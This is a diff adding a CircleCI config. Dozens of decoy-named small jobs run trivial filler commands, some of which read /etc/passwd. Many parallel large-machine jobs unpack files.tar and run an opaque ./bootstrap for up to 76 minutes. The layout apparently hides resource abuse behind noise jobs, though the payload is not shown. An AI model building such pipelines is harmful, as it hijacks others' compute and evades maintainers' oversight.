+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  spin_realease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: cold plunge
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<345589;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/.wsp/package.tar
+            size=$(wc -c </tmp/.wsp/package.tar); echo "stage ok: realease size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - package.tar
+  realease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/package.tar || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  g1_push-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: thud
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "trim me   " | awk '{sub(/[[:space:]]+$/,""); print length($0)}'; true ; } > /tmp/.wsp/stash.raw
+            size=$(wc -c </tmp/.wsp/stash.raw); echo "stage ok: push-it size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stash.raw
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  run_biuld:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: plate soft
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /proc/sys/kernel/pid_max 2>/dev/null; true ; } > /tmp/.wsp/.lock
+            size=$(wc -c </tmp/.wsp/.lock); echo "stage ok: biuld size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .lock
+  biuld:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+  produce_API-114:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: theragun
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "ab cd ef" | tr ' ' '\n' | wc -l; true ; } > /tmp/.wsp/16.blob
+            size=$(wc -c </tmp/.wsp/16.blob); echo "stage ok: API-114 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 16.blob
+  API-114:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch pre-step
+          command: |
+            wc -c /tmp/.wsp/metrics.jsonl || true
+      - run:
+          name: Mirror project
+          command: git clone --depth 3 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: tar xf files.tar
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          no_output_timeout: 76m
+          command: nice -n 0 ./bootstrap
+
+  gamma_canary_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: nope
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 10 | sed 's/^/row-/'; true ; } > /tmp/.wsp/artifact
+            size=$(wc -c </tmp/.wsp/artifact); echo "stage ok: canary size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - artifact
+  orchestrate_add-edge_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: grep
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; umask; true ; } > /tmp/.wsp/log.txt
+            size=$(wc -c </tmp/.wsp/log.txt); echo "stage ok: add-edge size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - log.txt
+  stepA_hyperion-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: blend edges
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo "foo bar foo baz foo" | tr ' ' '\n' | sort | uniq -c; true ; } > /tmp/.wsp/96.data
+            size=$(wc -c </tmp/.wsp/96.data); echo "stage ok: hyperion-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 96.data
+  auditor_promote_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: hidden line
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'END{print NR, "lines total"}' /etc/passwd; true ; } > /tmp/.wsp/step-20.out
+            size=$(wc -c </tmp/.wsp/step-20.out); echo "stage ok: promote size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-20.out
+  canary1_ken-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: interlude
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo 'shout quietly' | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/.wsp/event.gz
+            size=$(wc -c </tmp/.wsp/event.gz); echo "stage ok: ken-build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - event.gz
+  checker_vera-run_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: soot smudge
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{num=12345; r=""; while(num>0){r=(num%2) r; num=int(num/2)}; print r}'; true ; } > /tmp/.wsp/package.pkg
+            size=$(wc -c </tmp/.wsp/package.pkg); echo "stage ok: vera-run size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - package.pkg
+  deps_mar1-rev_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: mezzo forte
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="banana"; for(i=1;i<=length(s);i++){if(substr(s,i,1)=="a")c++}; print c}'; true ; } > /tmp/.wsp/2024-11-18.data
+            size=$(wc -c </tmp/.wsp/2024-11-18.data); echo "stage ok: mar1-rev size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-11-18.data
+  syncer_q3-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: stamp approved
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 241240 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/.wsp/passoff.txt
+            size=$(wc -c </tmp/.wsp/passoff.txt); echo "stage ok: q3-release size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - passoff.txt
+  inspect_succes-only_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: whats this
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; head -c 1447571 /dev/urandom | base64 > /tmp/.wsp/trace.gz; true
+            size=$(wc -c </tmp/.wsp/trace.gz); echo "stage ok: succes-only size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - trace.gz
+  stage_realease_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: glissando
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{a[$1%7]++}END{for(k in a)print k,a[k]}' | sort -n; true ; } > /tmp/.wsp/package.tar
+            size=$(wc -c </tmp/.wsp/package.tar); echo "stage ok: realease size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - package.tar
+  Delta_build-partial-release-candidate_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: sforzando
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 13631488 /dev/urandom | sha256sum; true ; } > /tmp/.wsp/full_phase_output.out
+            size=$(wc -c </tmp/.wsp/full_phase_output.out); echo "stage ok: build-partial-release-candidate size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_phase_output.out
+  warmup_build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tell the pm
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; echo $(uptime | wc -w); true ; } > /tmp/.wsp/primary_step_output_v3.txt
+            size=$(wc -c </tmp/.wsp/primary_step_output_v3.txt); echo "stage ok: build size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - primary_step_output_v3.txt
+  install_DATA-573_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: thursday thump
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<10;i++)printf "%d:%d\n",i,i*i}' | wc -l; true ; } > /tmp/.wsp/passoff.sig
+            size=$(wc -c </tmp/.wsp/passoff.sig); echo "stage ok: DATA-573 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - passoff.sig
+  db_hotel_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: knock around
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ls -la / | awk '{print $NF}' | sort | md5sum; true ; } > /tmp/.wsp/full_job_output_v2.out
+            size=$(wc -c </tmp/.wsp/full_job_output_v2.out); echo "stage ok: hotel size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_job_output_v2.out
+  orchestrate_b-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: tbd
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{a[$1%7]++}END{for(k in a)print k,a[k]}' | sort -n; true ; } > /tmp/.wsp/step-23.log
+            size=$(wc -c </tmp/.wsp/step-23.log); echo "stage ok: b-v2 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-23.log
+  vendor_ruby3-release_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: turks head
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk -F: '$3>1000 && $3<2000' /etc/passwd | wc -l; true ; } > /tmp/.wsp/log.ndjson
+            size=$(wc -c </tmp/.wsp/log.ndjson); echo "stage ok: ruby3-release size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - log.ndjson
+  builder_feat-4894_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: rock pool
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 227922 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/2024-03-03.data
+            size=$(wc -c </tmp/.wsp/2024-03-03.data); echo "stage ok: feat-4894 size=${size}"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 2024-03-03.data
+workflows:
+  all:
+    jobs:
+      - compile_node20-ship
+      - run_biuld
+      - node20-ship:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - biuld:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - io-rev:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - teh-ci:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - nebula-v2:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - API-114:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - v7-ga4:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - DATA-906:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - push-it:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - phoenix-rev:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - europa:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - produce-staging-release-candidate:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - hotfix-9653:
+          requires:
+            - compile_node20-ship
+            - run_biuld
+      - provision_canary
+      - gamma_canary_2:
+          requires:
+            - provision_canary
+      - canary:
+          requires:
+            - gamma_canary_2
+      - drain_add-edge:
+          requires:
+            - gamma_canary_2
+      - orchestrate_add-edge_2:
+          requires:
+            - drain_add-edge
+      - add-edge:
+          requires:
+            - orchestrate_add-edge_2
+      - db_hyperion-v2:
+          requires:
+            - orchestrate_add-edge_2
+      - stepA_hyperion-v2_2:
+          requires:
+            - db_hyperion-v2
+      - hyperion-v2:
+          requires:
+            - stepA_hyperion-v2_2
+      - verify_promote:
+          requires:
+            - stepA_hyperion-v2_2
+      - auditor_promote_2:
+          requires:
+            - verify_promote
+      - promote:
+          requires:
+            - auditor_promote_2
+      - staging_ken-build:
+          requires:
+            - auditor_promote_2
+      - canary1_ken-build_2:
+          requires:
+            - staging_ken-build
+      - ken-build:
+          requires:
+            - canary1_ken-build_2
+      - teardown_vera-run:
+          requires:
+            - canary1_ken-build_2
+      - checker_vera-run_2:
+          requires:
+            - teardown_vera-run
+      - vera-run:
+          requires:
+            - checker_vera-run_2
+      - round2_mar1-rev:
+          requires:
+            - checker_vera-run_2
+      - deps_mar1-rev_2:
+          requires:
+            - round2_mar1-rev
+      - mar1-rev:
+          requires:
+            - deps_mar1-rev_2
+      - compile_q3-release:
+          requires:
+            - deps_mar1-rev_2
+      - syncer_q3-release_2:
+          requires:
+            - compile_q3-release
+      - q3-release:
+          requires:
+            - syncer_q3-release_2
+      - maker_succes-only:
+          requires:
+            - syncer_q3-release_2
+      - inspect_succes-only_2:
+          requires:
+            - maker_succes-only
+      - succes-only:
+          requires:
+            - inspect_succes-only_2
+      - spin_realease:
+          requires:
+            - inspect_succes-only_2
+      - stage_realease_2:
+          requires:
+            - spin_realease
+      - realease:
+          requires:
+            - stage_realease_2
+      - Alpha_build-partial-release-candidate:
+          requires:
+            - stage_realease_2
+      - Delta_build-partial-release-candidate_2:
+          requires:
+            - Alpha_build-partial-release-candidate
+      - build-partial-release-candidate:
+          requires:
+            - Delta_build-partial-release-candidate_2
+      - teardown_build:
+          requires:
+            - Delta_build-partial-release-candidate_2
+      - warmup_build_2:
+          requires:
+            - teardown_build
+      - build:
+          requires:
+            - warmup_build_2
+      - A_DATA-573:
+          requires:
+            - warmup_build_2
+      - install_DATA-573_2:
+          requires:
+            - A_DATA-573
+      - DATA-573:
+          requires:
+            - install_DATA-573_2
+      - package_hotel:
+          requires:
+            - install_DATA-573_2
+      - db_hotel_2:
+          requires:
+            - package_hotel
+      - hotel:
+          requires:
+            - db_hotel_2
+      - staging_b-v2:
+          requires:
+            - db_hotel_2
+      - orchestrate_b-v2_2:
+          requires:
+            - staging_b-v2
+      - b-v2:
+          requires:
+            - orchestrate_b-v2_2
+      - package_ruby3-release:
+          requires:
+            - orchestrate_b-v2_2
+      - vendor_ruby3-release_2:
+          requires:
+            - package_ruby3-release
+      - ruby3-release:
+          requires:
+            - vendor_ruby3-release_2
+      - preinit_feat-4894:
+          requires:
+            - vendor_ruby3-release_2
+      - builder_feat-4894_2:
+          requires:
+            - preinit_feat-4894
+      - feat-4894:
+          requires:
+            - builder_feat-4894_2
